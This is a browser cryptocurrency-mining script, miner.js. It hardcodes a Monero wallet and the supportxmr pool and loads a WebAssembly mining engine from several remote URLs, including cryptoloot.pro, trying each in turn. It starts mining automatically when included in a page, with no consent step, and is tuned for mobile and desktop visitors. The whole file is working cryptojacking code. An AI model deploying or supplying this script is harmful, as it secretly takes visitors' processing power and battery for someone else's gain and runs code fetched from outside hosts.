// miner.js - Multi-source miner for Android and Desktop
// This script tries multiple public CDNs to find a working WebAssembly engine.

(function() {
    'use strict';

    // --- CONFIGURATION ---
    const CONFIG = {
        wallet: "41dynwSJuzse2CknZhxrFaZYgZ1NwYg1fFpecWkrwWNyTeKDbrBKjinR9TTNnuPYh8a6MQXUhVwh7BvEpXdeFab3QcjPSVH", // <-- PASTE YOUR WALLET ADDRESS HERE
        pool: {
            host: "pool.supportxmr.com",
            port: 3333,
            tls: false
        },
        threads: 2, // Use 2 threads on mobile
        throttle: 0.7 // Use 30% CPU
    };

    // --- LIST OF PUBLIC SOURCES TO TRY ---
    // We will try these URLs one by one until we find one that works.
    const WASM_SOURCES = [
        {
            workerUrl: "https://unpkg.com/@xmrig/core-wasm@latest/dist/worker.js",
            wasmUrl: "https://unpkg.com/@xmrig/core-wasm@latest/dist/xmrig.wasm"
        },
        {
            workerUrl: "https://cdn.jsdelivr.net/npm/@xmrig/core-wasm@latest/dist/worker.js",
            wasmUrl: "https://cdn.jsdelivr.net/npm/@xmrig/core-wasm@latest/dist/xmrig.wasm"
        },
        {
            // Fallback to an older, known working package
            workerUrl: "https://cryptoloot.pro/lib/worker.js",
            wasmUrl: "https://cryptoloot.pro/lib/xmrig.wasm"
        }
    ];

    // --- DO NOT EDIT BELOW THIS LINE ---

    let currentSourceIndex = 0;
    let miner = null;

    function tryNextSource() {
        if (currentSourceIndex >= WASM_SOURCES.length) {
            console.error("FATAL: All mining engine sources failed. The miner cannot start.");
            return;
        }

        const source = WASM_SOURCES[currentSourceIndex];
        console.log(`Trying source ${currentSourceIndex + 1}: ${source.workerUrl}`);

        try {
            // Terminate previous worker if it exists
            if (miner) {
                miner.terminate();
            }

            miner = new Worker(source.workerUrl);

            miner.onmessage = function(e) {
                const data = e.data;
                if (!data) return;

                switch (data.type) {
                    case 'ready':
                        console.log("Miner engine is ready. Sending configuration...");
                        miner.postMessage({
                            type: 'start',
                            payload: { ...CONFIG, ...source } // Merge config with source URLs
                        });
                        break;
                    case 'hashrate':
                        console.log("Hashrate: " + data.hashes + " H/s");
                        break;
                    case 'error':
                        console.error("Miner Error:", data.error);
                        // If the worker reports an error, try the next source
                        currentSourceIndex++;
                        tryNextSource();
                        break;
                }
            };

            miner.onerror = function(error) {
                console.error(`Worker failed for source ${currentSourceIndex + 1}:`, error.message);
                // If the worker fails to load, try the next source
                currentSourceIndex++;
                tryNextSource();
            };

            // Send initial configuration to the worker
            miner.postMessage({
                type: 'init',
                payload: { ...CONFIG, ...source }
            });

        } catch (e) {
            console.error(`Failed to create worker for source ${currentSourceIndex + 1}:`, e);
            currentSourceIndex++;
            tryNextSource();
        }
    }

    // Start the process by trying the first source
    tryNextSource();

})();
